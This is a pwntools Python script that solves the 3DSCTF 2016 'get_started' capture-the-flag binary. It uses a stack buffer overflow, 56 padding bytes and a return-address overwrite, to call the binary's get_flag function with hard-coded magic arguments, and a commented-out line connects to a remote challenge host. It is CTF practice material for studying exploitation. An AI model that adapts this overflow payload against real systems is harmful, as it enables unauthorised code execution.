from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
io = process('./get_started_3dsctf_2016')
#io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
get_flag = 0x080489A0
payload = b'A'*56+p32(get_flag)+p32(0x804e6a0)+p32(814536271)+p32(0x195719D1)
io.sendline(payload)
io.interactive()